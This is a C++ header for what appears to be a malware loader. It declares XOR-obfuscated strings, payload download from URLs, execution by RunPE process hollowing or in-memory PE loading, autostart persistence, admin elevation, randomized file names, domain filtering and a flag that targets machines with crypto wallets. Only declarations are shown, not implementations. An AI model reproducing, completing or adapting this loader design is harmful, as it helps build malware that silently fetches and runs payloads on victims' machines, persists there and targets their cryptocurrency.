#pragma once

#include <Windows.h>
#include <string>
#include <vector>

#include "DynImport.h"
#include "xor.h" 

using std::string;
using std::vector;

#define XOR(x) XorStr(x)

enum LaunchType
{
	loader_RunPE = 1,
	loader_CreateProcess,
	loader_ShellExecute,
	loader_LoadPE,
	loader_LoadLibrary
};

enum SystemType
{
	loader_Both = 1,
	loader_X32,
	loader_X64,
	loader_Trash // не знакомый выбор
};

struct LoadedFileState
{
	HANDLE thread;
	bool active;
};

struct LoaderRule
{
	string url;
	LaunchType launchType;
	SystemType systemType;
	string args;
	unsigned short launchOption;
	vector<string> onlyDomains;
	bool cryptoOnly;
	bool addAutoStart;
	bool launchAsAdmin;
	unsigned short id;
	bool randomName;
	bool repeat;

	bool active;
};

static DWORD secp2vmemp[2][2][2] = 
{ 
	{ { PAGE_NOACCESS, PAGE_WRITECOPY }, { PAGE_READONLY, PAGE_READWRITE } },
	{ { PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY }, { PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE } }
};

class Loader
{
	void RunPE(void * Image, const string & path, const string & args);
	void* LoadPE(void * pData);

	void _memcpy(void * dst, const void * src, size_t size);

	float stringCompare(const string & str1, const string & str2);

	bool findEntry(const vector<string> & src, const string & what);
	bool findEntry(const vector<unsigned int> & src, unsigned int what);

	string random_string(const size_t size);
public:
	void DownloadFile(const string & site, string & file);

	void processDomains(vector<LoaderRule> & rules, const vector<unsigned int> & hashes);
	void execute(const vector<LoaderRule> & rules, bool cryptoWallet, vector<LoadedFileState> & threads);
};